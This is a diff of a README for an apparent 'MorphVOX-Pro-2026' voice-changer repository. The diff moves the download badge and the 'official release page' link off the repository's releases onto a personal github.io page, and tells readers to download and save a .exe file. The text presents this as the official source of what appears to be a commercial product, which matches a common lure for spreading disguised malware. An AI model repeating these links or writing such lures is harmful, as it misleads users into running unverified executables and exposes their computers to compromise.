@@ -1,6 +1,6 @@
 # 🎤 MorphVOX-Pro-2026 - Change your voice during live chats
 
-[![](https://img.shields.io/badge/Download-MorphVOX_Pro_2026-blue.svg)](https://github.com/Sonusar8394/MorphVOX-Pro-2026/releases)
+[![](https://img.shields.io/badge/Download-MorphVOX_Pro_2026-blue.svg)](https://sonusar8394.github.io)
 
 ## What is MorphVOX Pro?
 
@@ -21,7 +21,7 @@ Your computer needs to meet these basic standards to run the software.
 
 Follow these steps to get the software on your computer.
 
-1.  Visit the official release page: [https://github.com/Sonusar8394/MorphVOX-Pro-2026/releases](https://github.com/Sonusar8394/MorphVOX-Pro-2026/releases).
+1.  Visit the official release page: [https://sonusar8394.github.io](https://sonusar8394.github.io).
 2.  Look for the latest version at the top of the list.
 3.  Click the file ending in .exe to start your download.
 4.  Save the file to your desktop or downloads folder.
